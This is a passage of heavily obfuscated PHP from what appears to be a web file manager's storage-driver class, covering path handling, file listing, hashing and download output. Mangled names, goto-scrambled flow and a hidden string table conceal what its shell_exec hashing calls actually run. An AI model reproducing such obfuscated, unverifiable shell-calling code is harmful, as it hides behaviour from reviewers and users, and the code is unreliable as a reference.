$E‹ˆÑö°Ù…[67] . $FÎö‚ÏÉ∞Á . $E‹ˆÑö°Ù…[68] . $fÈ„¡èÍÜ¢; if (isset($A÷ÂÜÎ±È÷[$bª‰Û’…¿ñ])) { return $A÷ÂÜÎ±È÷[$bª‰Û’…¿ñ]; } if (function_exists($E‹ˆÑö°Ù…[69])) { $AË‰‚†ô≥à = @mb_convert_encoding($fÈ„¡èÍÜ¢, $FÎö‚ÏÉ∞Á, $E‰ßî‰©ùƒ); } else { $AË‰‚†ô≥à = @iconv($E‰ßî‰©ùƒ, $FÎö‚ÏÉ∞Á, $fÈ„¡èÍÜ¢); } goto E˜éø´ª—Ω; Bé◊çÛú€«: } public function getPathInner($fâñôòﬁ¶…) { $CŸõòËÈ∫£ = IO::init($fâñôòﬁ¶…); return $CŸõòËÈ∫£->path; } public function getPathOuter($dáÏıÎ∆Ç§) { $D“Éπã…Ôé =& $_SERVER[’ÿƒ†ïò]; $e‡¿€»◊ºä = strlen(trim($this->pathBase, $D“Éπã…Ôé[8])); $dáÏıÎ∆Ç§ = substr(trim($dáÏıÎ∆Ç§, $D“Éπã…Ôé[8]), $e‡¿€»◊ºä); return $this->pathDriver . $D“Éπã…Ôé[8] . ltrim($dáÏıÎ∆Ç§, $D“Éπã…Ôé[8]); } public function isParentOf($CµÊ∂˘Á‚‰, $bµ§Î“∂ç£) { $BäÑÖÃ∏∏î =& $_SERVER[’ÿƒ†ïò]; $CµÊ∂˘Á‚‰ = rtrim(strtolower($CµÊ∂˘Á‚‰), $BäÑÖÃ∏∏î[8]) . $BäÑÖÃ∏∏î[8]; $bµ§Î“∂ç£ = rtrim(strtolower($bµ§Î“∂ç£), $BäÑÖÃ∏∏î[8]) . $BäÑÖÃ∏∏î[8]; $eÏ ö¯–∑£ = strpos($bµ§Î“∂ç£, $CµÊ∂˘Á‚‰) === 0; return $eÏ ö¯–∑£; } public function getType() { $b¬àñó≤›Ñ =& $_SERVER[’ÿƒ†ïò]; $a´ëÜâ˜ë = str_replace($b¬àñó≤›Ñ[72], $b¬àñó≤›Ñ[33], get_class($this)); return strtolower($a´ëÜâ˜ë); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($B˜úà‘Ñ·§, $Dé§Ó≠†ñ’) { $eÏ £ã¬’§ =& $_SERVER[’ÿƒ†ïò]; $aÖûﬁﬁÓÓÃ = rtrim($B˜úà‘Ñ·§, $eÏ £ã¬’§[8]) . $eÏ £ã¬’§[8] . $Dé§Ó≠†ñ’; $Aõ«ÕÃçıî = $this->exist($aÖûﬁﬁÓÓÃ); return $Aõ«ÕÃçıî ? $aÖûﬁﬁÓÓÃ : !1; } public function setModifyTime($D·Î€Ê£“ø, $fÚ¢ô≤µ≤‹ = '') { } public function renameObject($BñÉ¡ƒ§à¯, $F€≤Áˆó´õ) { goto eÒÇëëë–Â; aàøµå¢±‘: $BñÉ¡ƒ§à¯ = $this->getPathOuter($BñÉ¡ƒ§à¯); $F€≤Áˆó´õ = $this->pathFather($BñÉ¡ƒ§à¯) . $F€≤Áˆó´õ; if (IO::isFile($BñÉ¡ƒ§à¯)) { $D«Ëó˘à®‰ = IO::copy($BñÉ¡ƒ§à¯, $this->pathFather($BñÉ¡ƒ§à¯), REPEAT_RENAME_FOLDER, $e„é¢ß∫ÑÑ); if ($D«Ëó˘à®‰) { IO::remove($BñÉ¡ƒ§à¯); } } else { $D«Ëó˘à®‰ = IO::mkdir($F€≤Áˆó´õ); if (!$D«Ëó˘à®‰) { return !1; } $A∏†◊€‚•ß = IO::listPath($BñÉ¡ƒ§à¯, !0); $fºöÁ„ùÇ€ = array_merge($A∏†◊€‚•ß[$F≈ã≈˘‚ ï[74]], $A∏†◊€‚•ß[$F≈ã≈˘‚ ï[75]]); foreach ($fºöÁ„ùÇ€ as $c®ñÑì¥›⁄) { IO::move($c®ñÑì¥›⁄[$F≈ã≈˘‚ ï[76]], $F€≤Áˆó´õ, REPEAT_RENAME_FOLDER); } IO::remove($BñÉ¡ƒ§à¯); } goto dŸéä–à∫˘; eÒÇëëë–Â: $F≈ã≈˘‚ ï =& $_SERVER[’ÿƒ†ïò]; $e„é¢ß∫ÑÑ = $F€≤Áˆó´õ; Hook::trigger($F≈ã≈˘‚ ï[73], $this, $BñÉ¡ƒ§à¯, $this, $this->pathFather($BñÉ¡ƒ§à¯) . $F€≤Áˆó´õ); goto aàøµå¢±‘; dŸéä–à∫˘: return $D«Ëó˘à®‰ ? $F€≤Áˆó´õ : !1; goto eœ¶≠âãî»; eœ¶≠âãî»: } public function tempFile($câ”Üà°§† = '', $C€⁄¬Ìˆ∑¯ = '') { goto E¿®±œÛÎ“; d§â˘ÁÉ∑ : $aöâæ‰äáá = $b£ñïÙﬂ‘Ñ . $câ”Üà°§†; @touch($aöâæ‰äáá); if ($C€⁄¬Ìˆ∑¯) { file_put_contents($aöâæ‰äáá, $C€⁄¬Ìˆ∑¯); } goto B‘”ÛƒŒπÿ; B‘”ÛƒŒπÿ: return $aöâæ‰äáá; goto dÖ™òíÕÎÉ; E¿®±œÛÎ“: if (!$câ”Üà°§†) { $câ”Üà°§† = rand_string(15); } $b£ñïÙﬂ‘Ñ = TEMP_FILES . rand_string(15) . $_SERVER[’ÿƒ†ïò][8]; @mkdir($b£ñïÙﬂ‘Ñ, DEFAULT_PERRMISSIONS, !0); goto d§â˘ÁÉ∑ ; dÖ™òíÕÎÉ: } public function tempFileRemve($A¥Øñ¿ﬂôÏ) { @unlink($A¥Øñ¿ﬂôÏ); @rmdir($this->pathFather($A¥Øñ¿ﬂôÏ)); } public function mkfile($AÉ∆©¿‘”Â, $B·úÆ©¿◊– = '', $aà∏”ÿ«‘≈ = REPEAT_RENAME) { } public function mkdir($F≥ÔÃßƒ≈á, $Cß¢‹£¬’» = REPEAT_SKIP) { } public function delFile($A˜ÔÑ±ÊöŒ) { } public function delFolder($dúñÙëäÿÆ) { } public function copyFile($a ∫ùˆ∏™—, $D´ó”ïüøÜ) { } public function moveFile($c‡Î¨É—ïä, $aùâÒƒ¿§É) { } public function remove($b◊”ë™âœ´) { if ($this->isFile($b◊”ë™âœ´)) { return $this->delFile($b◊”ë™âœ´); } return $this->delFolder($b◊”ë™âœ´); } public function rename($AÍ∑ÃÑÈ‰», $EÎÖπÜœôî) { } public function exist($bºÇÚÙæŒÃ) { } public function findByHash($bÛö©Æ‹§Ù = '', $eÒ√ı´´™ç = '') { return !1; } public function isFile($A©Ù—ºá˜ü) { } public function isFolder($Cïâ»◊¯◊ö) { } public function size($eØ ç‘Æèõ) { } public function info($D€·ïûÒ¶∫) { } public function infoSimple($a †Ù≈ûáô) { return $this->info($a †Ù≈ûáô); } public function infoAuth($dáÉ∏’Ú≥ê) { return $this->info($dáÉ∏’Ú≥ê); } public function infoFull($dîÌöøÿ‡«) { return $this->info($dîÌöøÿ‡«); } public function infoWithChildren($cÎòéâˆÈä) { $EØÙ†éú‡Ù =& $_SERVER[’ÿƒ†ïò]; static $Eﬂé„ÿ∂ç˘ = array(); if (isset($Eﬂé„ÿ∂ç˘[$cÎòéâˆÈä])) { return $Eﬂé„ÿ∂ç˘[$cÎòéâˆÈä]; } $C∫È∆Ç√Â© = $this->info($cÎòéâˆÈä); if ($C∫È∆Ç√Â© && $C∫È∆Ç√Â©[$EØÙ†éú‡Ù[29]] == $EØÙ†éú‡Ù[77]) { $c∞Ûœı∏®≥ = array($EØÙ†éú‡Ù[78] => 0, $EØÙ†éú‡Ù[79] => 0, $EØÙ†éú‡Ù[80] => 0); $this->infoChildren($cÎòéâˆÈä, $c∞Ûœı∏®≥); $C∫È∆Ç√Â©[$EØÙ†éú‡Ù[78]] = $c∞Ûœı∏®≥[$EØÙ†éú‡Ù[78]]; $C∫È∆Ç√Â©[$EØÙ†éú‡Ù[81]] = array($EØÙ†éú‡Ù[82] => $c∞Ûœı∏®≥[$EØÙ†éú‡Ù[79]], $EØÙ†éú‡Ù[83] => $c∞Ûœı∏®≥[$EØÙ†éú‡Ù[80]]); $Eﬂé„ÿ∂ç˘[$cÎòéâˆÈä] = $C∫È∆Ç√Â©; } return $C∫È∆Ç√Â©; } public function listPath($a»É”Ñº†è, $aπéÖç°±— = false) { } public function has($BêûßÙçÛ, $f«ÿ¯Õé¬û = false, $cÛñö¨£»Ê = false) { } public function canRead($D⁄ ŒıÍù¬) { } public function canWrite($bàáŒ¬Ø—∆) { } public function getContent($b°ÏŒÜ·≈®) { } public function setContent($B≈¡“ÇìøÍ, $E˘¿Ã·ï¥ˆ = '') { } protected function infoChildren($E˜Ωõ‘ê∂Ö, &$Eù≥∆ó™Ú‚) { $eÖ™‚Ÿ‚–Î =& $_SERVER[’ÿƒ†ïò]; check_abort_echo(); $D¬èÁ∞ÂêÖ = $this->listPath($E˜Ωõ‘ê∂Ö, !0); $D¬èÁ∞ÂêÖ = array_merge($D¬èÁ∞ÂêÖ[$eÖ™‚Ÿ‚–Î[75]], $D¬èÁ∞ÂêÖ[$eÖ™‚Ÿ‚–Î[74]]); foreach ($D¬èÁ∞ÂêÖ as $Aµ≤¯¢ÊÑÁ) { if ($Aµ≤¯¢ÊÑÁ[$eÖ™‚Ÿ‚–Î[29]] == $eÖ™‚Ÿ‚–Î[77]) { $Eù≥∆ó™Ú‚[$eÖ™‚Ÿ‚–Î[80]]++; $BË˘”¢·ﬁÏ = $this->getPathInner($Aµ≤¯¢ÊÑÁ[$eÖ™‚Ÿ‚–Î[76]]); $this->infoChildren($BË˘”¢·ﬁÏ, $Eù≥∆ó™Ú‚); } else { $Eù≥∆ó™Ú‚[$eÖ™‚Ÿ‚–Î[79]]++; $Eù≥∆ó™Ú‚[$eÖ™‚Ÿ‚–Î[78]] += $Aµ≤¯¢ÊÑÁ[$eÖ™‚Ÿ‚–Î[78]]; } } } public function fileSubstr($aŒàÙÍÏÖº, $fÉß¥íå´Û, $C√üŒÉ≥∆–) { } public function listAll($eÖÃ¢Ò¬ë◊) { } public function listAllMake($fÑáä÷≥„†, &$DÜÉƒçÈàÚ) { $bƒ…á√òÛè =& $_SERVER[’ÿƒ†ïò]; check_abort_echo(); $A“±π•®¶¶ = $this->listPath($fÑáä÷≥„†, !0); if (!$A“±π•®¶¶) { return; } $aÀ∆∫âãÑû = array_merge($A“±π•®¶¶[$bƒ…á√òÛè[75]], $A“±π•®¶¶[$bƒ…á√òÛè[74]]); foreach ($aÀ∆∫âãÑû as $dÂƒò°Ÿí·) { goto B¥Ã£Ù◊ƒÊ; Eº√úΩîÍï: if (isset($dÂƒò°Ÿí·[$bƒ…á√òÛè[84]])) { $A™»¬Ô¢’¥[$bƒ…á√òÛè[84]] = $dÂƒò°Ÿí·[$bƒ…á√òÛè[84]]; } if (!$D©ÒÛƒ°éı) { $DÜÉƒçÈàÚ[] = $A™»¬Ô¢’¥; continue; } $DÜÉƒçÈàÚ[] = $A™»¬Ô¢’¥; goto FåªÓÑ£ÉÉ; FåªÓÑ£ÉÉ: $this->listAllMake($dÂƒò°Ÿí·[$bƒ…á√òÛè[76]], $DÜÉƒçÈàÚ); goto CºŒöéÖíˆ; B¥Ã£Ù◊ƒÊ: $D©ÒÛƒ°éı = $dÂƒò°Ÿí·[$bƒ…á√òÛè[29]] == $bƒ…á√òÛè[77]; $A™»¬Ô¢’¥ = array($bƒ…á√òÛè[76] => $dÂƒò°Ÿí·[$bƒ…á√òÛè[76]], $bƒ…á√òÛè[77] => $D©ÒÛƒ°éı); if (isset($dÂƒò°Ÿí·[$bƒ…á√òÛè[78]])) { $A™»¬Ô¢’¥[$bƒ…á√òÛè[78]] = $dÂƒò°Ÿí·[$bƒ…á√òÛè[78]]; } goto Eº√úΩîÍï; CºŒöéÖíˆ: } } public function listAllSimple($dêÉπúèè) { $E¯≤™’óÏô =& $_SERVER[’ÿƒ†ïò]; $aø“Èã÷´ø = array(); $d±ò»Ë⁄©ﬁ = $this->listAll($dêÉπúèè); $fΩãÌ√Î⁄é = $this->getPathOuter($dêÉπúèè); foreach ($d±ò»Ë⁄©ﬁ as $f¨äáÕòÃ®) { goto Bä•üƒ∫≠«; Bä•üƒ∫≠«: $AÕÚ¡Üó Õ = $f¨äáÕòÃ®[$E¯≤™’óÏô[76]]; $EâÊ∆∆ØâÖ = $f¨äáÕòÃ®[$E¯≤™’óÏô[76]]; if (isset($f¨äáÕòÃ®[$E¯≤™’óÏô[85]])) { $AÕÚ¡Üó Õ = $f¨äáÕòÃ®[$E¯≤™’óÏô[85]][$E¯≤™’óÏô[76]]; $f¨äáÕòÃ®[$E¯≤™’óÏô[78]] = $f¨äáÕòÃ®[$E¯≤™’óÏô[85]][$E¯≤™’óÏô[78]]; $f¨äáÕòÃ®[$E¯≤™’óÏô[84]] = $f¨äáÕòÃ®[$E¯≤™’óÏô[85]][$E¯≤™’óÏô[84]]; } else { $EâÊ∆∆ØâÖ = substr($f¨äáÕòÃ®[$E¯≤™’óÏô[76]], strlen(get_path_father($fΩãÌ√Î⁄é))); $EâÊ∆∆ØâÖ = $E¯≤™’óÏô[8] . ltrim($EâÊ∆∆ØâÖ, $E¯≤™’óÏô[8]); } goto dä÷óéàﬂÑ; e∫ÆÎ◊ƒÃË: if (!$f¨äáÕòÃ®[$E¯≤™’óÏô[77]]) { $DôÜÎË´ﬁ„[$E¯≤™’óÏô[86]] = $AÕÚ¡Üó Õ; } $aø“Èã÷´ø[] = $DôÜÎË´ﬁ„; goto Cµú–—ßô∏; dä÷óéàﬂÑ: $DôÜÎË´ﬁ„ = array($E¯≤™’óÏô[76] => $EâÊ∆∆ØâÖ, $E¯≤™’óÏô[77] => $f¨äáÕòÃ®[$E¯≤™’óÏô[77]]); if (isset($f¨äáÕòÃ®[$E¯≤™’óÏô[78]]) && !$f¨äáÕòÃ®[$E¯≤™’óÏô[77]]) { $DôÜÎË´ﬁ„[$E¯≤™’óÏô[78]] = $f¨äáÕòÃ®[$E¯≤™’óÏô[78]]; } if (isset($f¨äáÕòÃ®[$E¯≤™’óÏô[84]])) { $DôÜÎË´ﬁ„[$E¯≤™’óÏô[84]] = $f¨äáÕòÃ®[$E¯≤™’óÏô[84]]; } goto e∫ÆÎ◊ƒÃË; Cµú–—ßô∏: } return $aø“Èã÷´ø; } public function upload($e¬ı»ÏÉëë, $FØ◊—ó‰âé, $D—òåµã´– = false, $cΩ‹À§ªﬂ– = REPEAT_REPLACE) { } public function uploadFileByID($E‚¨ì·Á∞≈, $Bµë∆ßà∂…, $FπÔäº·Üä) { } public function uploadFileByPath($d˘˘¯ÕøÌî, $Cƒ≠¬∞å—Ù, $B◊ñÁ◊ åÖ = array()) { } public function isUploadServer() { $Aﬂﬂ¥Á†÷á =& $_SERVER[’ÿƒ†ïò]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Aﬂﬂ¥Á†÷á[87]) { return !0; } return $GLOBALS[$Aﬂﬂ¥Á†÷á[6]][$Aﬂﬂ¥Á†÷á[88]][$Aﬂﬂ¥Á†÷á[89]]; } public function isFileOutServer() { $bﬁ™ÉŒª∂∫ =& $_SERVER[’ÿƒ†ïò]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $bﬁ™ÉŒª∂∫[87]) { return !0; } return $GLOBALS[$bﬁ™ÉŒª∂∫[6]][$bﬁ™ÉŒª∂∫[88]][$bﬁ™ÉŒª∂∫[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($d›“Î¬Ïóï) { $dÆæº≤“∞º =& $_SERVER[’ÿƒ†ïò]; if (!$this->isCdnHost()) { return $d›“Î¬Ïóï; } return str_replace(trim(get_url_root($d›“Î¬Ïóï), $dÆæº≤“∞º[8]), trim($this->cdnHost, $dÆæº≤“∞º[8]), $d›“Î¬Ïóï); } public function uploadLink($AŸÈêı˜≥Ú, $C©›ä⁄–í§ = 0) { goto c™Ï£¿ÜÊ; e»¯⁄ÏÉ¯ñ: $bµπÍûÙÔ  = $C©›ä⁄–í§ <= $d©ÿ≥Ù£íÜ ? $A©ùÍÔëãâ[91] : $A©ùÍÔëãâ[92]; $E≈ÎÏ¯–ÆØ = (!$C©›ä⁄–í§ ? 1 : ceil($C©›ä⁄–í§ / pow(1024, 3))) * 3600 * 4; $BÇ∑ä÷Ó™ã = $this->{$bµπÍûÙÔ }($AŸÈêı˜≥Ú, $E≈ÎÏ¯–ÆØ); goto FæÜ˘É≤‚π; Aó◊•äˆúﬂ: if (!in_array($BƒŸ–ö†ø…, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $d©ÿ≥Ù£íÜ = 1024 * 1024 * 10; goto e»¯⁄ÏÉ¯ñ; FæÜ˘É≤‚π: if ($BÇ∑ä÷Ó™ã) { $BÇ∑ä÷Ó™ã[$A©ùÍÔëãâ[93]] = $AŸÈêı˜≥Ú; $BÇ∑ä÷Ó™ã[$A©ùÍÔëãâ[94]] = $BƒŸ–ö†ø…; } return $BÇ∑ä÷Ó™ã; goto eÏﬁÜˆïëæ; c™Ï£¿ÜÊ: $A©ùÍÔëãâ =& $_SERVER[’ÿƒ†ïò]; if ($this->isUploadServer()) { return; } $BƒŸ–ö†ø… = $this->getType(); goto Aó◊•äˆúﬂ; eÏﬁÜˆïëæ: } public function uploadFormData($A√áï ˘◊≤, $côè“˜˜∑è = 3600) { } public function multiUploadFormData($AÔãá∫´Ù¿, $B©ó…∂Êá¿ = 3600) { } public function download($a¢é‘ÁÂ’à, $D…÷—ì¥ „) { } public function ext($bî÷€ˆñÓ§) { $dº•ú⁄«øŒ =& $_SERVER[’ÿƒ†ïò]; if (strpos($bî÷€ˆñÓ§, $dº•ú⁄«øŒ[8]) === -1) { $Cíª∫≠®’ó = $bî÷€ˆñÓ§; } else { $Cíª∫≠®’ó = $this->pathThis($bî÷€ˆñÓ§); } $Cƒ„ê°¬õ¬ = $dº•ú⁄«øŒ[33]; if (strstr($Cíª∫≠®’ó, $dº•ú⁄«øŒ[95])) { $Cƒ„ê°¬õ¬ = substr($Cíª∫≠®’ó, strrpos($Cíª∫≠®’ó, $dº•ú⁄«øŒ[95]) + 1); $Cƒ„ê°¬õ¬ = strtolower($Cƒ„ê°¬õ¬); } if (strlen($Cƒ„ê°¬õ¬) > 3 && preg_match($dº•ú⁄«øŒ[96], $Cƒ„ê°¬õ¬, $Eú‹µüúÓÙ)) { $Cƒ„ê°¬õ¬ = $dº•ú⁄«øŒ[33]; } return $Cƒ„ê°¬õ¬; } public function pathThis($B‚†·…µã◊) { $eà≠±∫∑©Ù =& $_SERVER[’ÿƒ†ïò]; $B‚†·…µã◊ = str_replace($eà≠±∫∑©Ù[97], $eà≠±∫∑©Ù[8], rtrim($B‚†·…µã◊, $eà≠±∫∑©Ù[8])); $c◊Ôñ§¯∞ô = strrpos($B‚†·…µã◊, $eà≠±∫∑©Ù[8]); if ($c◊Ôñ§¯∞ô === !1) { return $B‚†·…µã◊; } return substr($B‚†·…µã◊, $c◊Ôñ§¯∞ô + 1); } public function pathFather($dÉéç“±≠É) { $bΩπ Ê¶Üá =& $_SERVER[’ÿƒ†ïò]; $dÉéç“±≠É = str_replace($bΩπ Ê¶Üá[97], $bΩπ Ê¶Üá[8], rtrim($dÉéç“±≠É, $bΩπ Ê¶Üá[8])); $A∂ö’àπÌÏ = strrpos($dÉéç“±≠É, $bΩπ Ê¶Üá[8]); if ($A∂ö’àπÌÏ === !1) { return $bΩπ Ê¶Üá[33]; } return substr($dÉéç“±≠É, 0, $A∂ö’àπÌÏ + 1); } public function hashSimple($fëé¢∞Ûóê) { goto f∏ÇÚ•‰…⁄; B»¬ ≤»„Ø: $dØÇÑÜïãö = 200; $D‡˘Ò ÓâÖ = 50; if ($d—ä—¬çñ∏ <= $dØÇÑÜïãö * $D‡˘Ò ÓâÖ) { return $this->hashMd5($fëé¢∞Ûóê) . $d—ä—¬çñ∏; } goto d·æ—…¬Çá; f∏ÇÚ•‰…⁄: $AÇ™√è‘≤í =& $_SERVER[’ÿƒ†ïò]; if (!$fëé¢∞Ûóê) { return md5($AÇ™√è‘≤í[33]); } $d—ä—¬çñ∏ = $this->size($fëé¢∞Ûóê); goto B»¬ ≤»„Ø; FÑŒ‘ãøÇ‚: $c≠–Úçóåõ .= $this->fileSubstr($fëé¢∞Ûóê, $d—ä—¬çñ∏ - $dØÇÑÜïãö, $dØÇÑÜïãö); return md5($c≠–Úçóåõ) . $d—ä—¬çñ∏; goto aÊè…ΩÉÈ; d·æ—…¬Çá: $D¶Õ®“‡Ï‡ = intval($d—ä—¬çñ∏ / $D‡˘Ò ÓâÖ); $c≠–Úçóåõ = $AÇ™√è‘≤í[33]; for ($d´«⁄ú≥æﬂ = 0; $d´«⁄ú≥æﬂ < $D‡˘Ò ÓâÖ; $d´«⁄ú≥æﬂ++) { $c≠–Úçóåõ .= $this->fileSubstr($fëé¢∞Ûóê, $D¶Õ®“‡Ï‡ * $d´«⁄ú≥æﬂ, $dØÇÑÜïãö); } goto FÑŒ‘ãøÇ‚; aÊè…ΩÉÈ: } public static $md5Cache = array(); public function hashMd5($fò”µ≠êﬁ—) { $fò”µ≠êﬁ— = $this->iconvSystem($fò”µ≠êﬁ—); if (isset(self::$md5Cache[$fò”µ≠êﬁ—])) { return self::$md5Cache[$fò”µ≠êﬁ—]; } self::$md5Cache[$fò”µ≠êﬁ—] = $this->hashMd5Shell($fò”µ≠êﬁ—); if (!self::$md5Cache[$fò”µ≠êﬁ—]) { self::$md5Cache[$fò”µ≠êﬁ—] = @md5_file($fò”µ≠êﬁ—); } return self::$md5Cache[$fò”µ≠êﬁ—]; } private function hashMd5Shell($e∂ü∑‡ªÿû) { goto cä¡◊¥’¡ß; cä¡◊¥’¡ß: $EªÖ’¨∂Æ• =& $_SERVER[’ÿƒ†ïò]; if (!function_exists($EªÖ’¨∂Æ•[98])) { return !1; } $eèØÃ‘êù» = array($EªÖ’¨∂Æ•[99], $EªÖ’¨∂Æ•[100]); goto Fƒâ’ÈÑØ…; Fƒâ’ÈÑØ…: $e±ΩıúÍëí = Cache::get($EªÖ’¨∂Æ•[101]); if (!$e±ΩıúÍëí) { $C≥≥˘¢Â˘È = BASIC_PATH . $EªÖ’¨∂Æ•[102]; $f‹–Ù®˜—Ö = md5_file($C≥≥˘¢Â˘È); $e±ΩıúÍëí = $EªÖ’¨∂Æ•[103]; foreach ($eèØÃ‘êù» as $F„‘ÖË⁄üÀ) { $E¡ﬂêááÈ¿ = shell_exec($F„‘ÖË⁄üÀ . "\40\x22{$C≥≥˘¢Â˘È}\x22"); if ($E¡ﬂêááÈ¿ && substr(trim($E¡ﬂêááÈ¿), 0, 32) == $f‹–Ù®˜—Ö) { $e±ΩıúÍëí = $F„‘ÖË⁄üÀ; break; } } Cache::set($EªÖ’¨∂Æ•[101], $e±ΩıúÍëí, 3600); } if ($e±ΩıúÍëí == $EªÖ’¨∂Æ•[103]) { return !1; } goto e˘Ó≥éÆÂâ; e˘Ó≥éÆÂâ: $E¡ﬂêááÈ¿ = shell_exec($e±ΩıúÍëí . "\x20\42{$e∂ü∑‡ªÿû}\42"); $E¡ﬂêááÈ¿ = str_replace($EªÖ’¨∂Æ•[104], $EªÖ’¨∂Æ•[33], $E¡ﬂêááÈ¿); return substr($E¡ﬂêááÈ¿, 0, 32); goto e∞Ï¶÷Ã√“; e∞Ï¶÷Ã√“: } public function link($fﬁç≥áÏºá) { return $fﬁç≥áÏºá; } public function fileOut($E√Ôâ¡¿“™, $C∑ûÖ†¯Ê• = false, $c≈´‰é™›≤ = false, $EÖΩà‹©Ïí = '') { goto f‡‚·Êáñﬁ; F⁄ú‘£öÖã: if (isset($_SERVER[$có–€…”Ôú[131]]) && strtotime($_SERVER[$có–€…”Ôú[131]]) == $b‰ƒﬂèó®ã[$có–€…”Ôú[84]]) { header($có–€…”Ôú[132], !0, 304); die; } if (isset($_SERVER[$có–€…”Ôú[133]]) && $_SERVER[$có–€…”Ôú[133]] == $EÖΩà‹©Ïí) { header($có–€…”Ôú[134] . $EÖΩà‹©Ïí, !0, 304); die; } header($có–€…”Ôú[134] . $EÖΩà‹©Ïí); goto cËÏû÷¢ï◊; c«êÆµ€Ø≤: if ($A•©Ç«Ü∆€) { $cåÌ€‰®∂¬ = intval(1000 * 1000 * ($Dô…úπÖπÇ / $A•©Ç«Ü∆€)); } while ($dî´≈‘·†— <= $A®¨àÆÑõ˜) { $fÏ»‰÷–©Ç = timeFloat(); check_abort(); $F‘‚ÌèéÓ  = $A®¨àÆÑõ˜ - $dî´≈‘·†— + 1; if ($F‘‚ÌèéÓ  <= $Dô…úπÖπÇ) { $Dô…úπÖπÇ = $F‘‚ÌèéÓ ; } echo $this->fileSubstr($E√Ôâ¡¿“™, $dî´≈‘·†—, $Dô…úπÖπÇ); $dî´≈‘·†— += $Dô…úπÖπÇ; if ($Dô…úπÖπÇ == $F‘‚ÌèéÓ ) { $dî´≈‘·†— = $A®¨àÆÑõ˜ + 1; } if ($cåÌ€‰®∂¬) { $f£◊¡èÈ¬Ñ = intval(1000 * 1000 * (timeFloat() - $fÏ»‰÷–©Ç)); $Bá±˘≈ÊµÓ = $cåÌ€‰®∂¬ - $f£◊¡èÈ¬Ñ; if ($Bá±˘≈ÊµÓ > 5) { usleep($Bá±˘≈ÊµÓ); } } } goto C·µ£åﬂå; B’µë∞ìû: $C’∫ªÖÊù† = !0; if ($_SERVER[$có–€…”Ôú[154]] == $có–€…”Ôú[155] && $bÙ°ÇÖ Ï¡ > 1204 * 1024 * 1024 * 2) { $C’∫ªÖÊù† = !1; } if ($C’∫ªÖÊù†) { header($có–€…”Ôú[156] . ($A®¨àÆÑõ˜ - $dî´≈‘·†— + 1)); } goto Dúã§Ö¢äß; EÓŒ®èº¿Æ: $dî´≈‘·†— = 0; $A®¨àÆÑõ˜ = $bÙ°ÇÖ Ï¡ - 1; $bÃå¥ŸêÜ™ = $this->ext($bãÒêßﬁ§Â); goto EË∫ˆˆñ◊€; c≥ô⁄∑É•: @ob_end_clean(); set_timeout(); $b‰ƒﬂèó®ã = $this->infoFull($E√Ôâ¡¿“™); goto AÑ¡É“…ﬂÜ; E”ı§Èâàﬁ: $c˘í„£µºï = get_file_mime($bÃå¥ŸêÜ™); if (strstr($c˘í„£µºï, $có–€…”Ôú[117])) { $c˘í„£µºï = $c˘í„£µºï . $có–€…”Ôú[118]; } if ($C∑ûÖ†¯Ê• === !1 && !mime_support($c˘í„£µºï)) { $C∑ûÖ†¯Ê• = !0; $c˘í„£µºï = $có–€…”Ôú[119]; } goto E‹áı…¬Õ⁄; dÑ™Çﬂƒê¨: header($có–€…”Ôú[128]); header($có–€…”Ôú[129]); header($có–€…”Ôú[130]); goto F⁄ú‘£öÖã; a—îèûÖÂâ: $C◊ßµíù¢® = $this->getType() == $có–€…”Ôú[106]; $Aèë˘ôòÙ† = $GLOBALS[$có–€…”Ôú[6]][$có–€…”Ôú[88]][$có–€…”Ôú[107]][$có–€…”Ôú[108]]; $A•©Ç«Ü∆€ = (double) $GLOBALS[$có–€…”Ôú[6]][$có–€…”Ôú[88]][$có–€…”Ôú[107]][$có–€…”Ôú[109]] * 1024 * 1024; goto c≥ô⁄∑É•; AÑ¡É“…ﬂÜ: $bÙ°ÇÖ Ï¡ = $b‰ƒﬂèó®ã[$có–€…”Ôú[78]]; $bËÏèº∞Ã  = gmdate($có–€…”Ôú[110], $b‰ƒﬂèó®ã[$có–€…”Ôú[84]]); $bãÒêßﬁ§Â = $c≈´‰é™›≤ ? $c≈´‰é™›≤ : $this->iconvApp($b‰ƒﬂèó®ã[$có–€…”Ôú[28]]); goto EÓŒ®èº¿Æ; Dúã§Ö¢äß: if ($_SERVER[$có–€…”Ôú[157]] == $có–€…”Ôú[158]) { return; } $Dô…úπÖπÇ = 1024 * 100; $cåÌ€‰®∂¬ = 0; goto c«êÆµ€Ø≤; E‹áı…¬Õ⁄: header($có–€…”Ôú[120]); header($có–€…”Ôú[121] . $c˘í„£µºï); $aöÙÑƒ„Íô = rawurlencode($bãÒêßﬁ§Â); goto Cπ≠ƒ¯¨àí; Cπ≠ƒ¯¨àí: $aöÙÑƒ„Íô = $có–€…”Ôú[116] . $aöÙÑƒ„Íô . $có–€…”Ôú[122] . $aöÙÑƒ„Íô; if ($C∑ûÖ†¯Ê•) { header($có–€…”Ôú[123]); header($có–€…”Ôú[124] . $aöÙÑƒ„Íô); } else { header($có–€…”Ôú[125] . $aöÙÑƒ„Íô); } header($có–€…”Ôú[126] . gmdate($có–€…”Ôú[110], time() + 3600 * 24 * 30) . $có–€…”Ôú[127]); goto dÑ™Çﬂƒê¨; c⁄É˘“‘¬‚: $eè°ÈÊÒºõ = strtolower($_SERVER[$có–€…”Ôú[142]]); if ($C◊ßµíù¢® && $eè°ÈÊÒºõ && $Aèë˘ôòÙ†) { if (strstr($eè°ÈÊÒºõ, $có–€…”Ôú[143])) { header($có–€…”Ôú[144] . $E√Ôâ¡¿“™); } else { if (strstr($eè°ÈÊÒºõ, $có–€…”Ôú[145])) { header($có–€…”Ôú[146] . $E√Ôâ¡¿“™); } else { if (strstr($eè°ÈÊÒºõ, $có–€…”Ôú[147])) { header($có–€…”Ôú[148] . $E√Ôâ¡¿“™); } } } if ($A•©Ç«Ü∆€) { header($có–€…”Ôú[149] . $A•©Ç«Ü∆€); } return; } if (isset($_SERVER[$có–€…”Ôú[150]])) { if (preg_match($có–€…”Ôú[151], $_SERVER[$có–€…”Ôú[150]], $Aä„ã¥ÕƒŸ)) { $dî´≈‘·†— = intval($Aä„ã¥ÕƒŸ[1]); if (!empty($Aä„ã¥ÕƒŸ[2])) { $A®¨àÆÑõ˜ = intval($Aä„ã¥ÕƒŸ[2]); } } 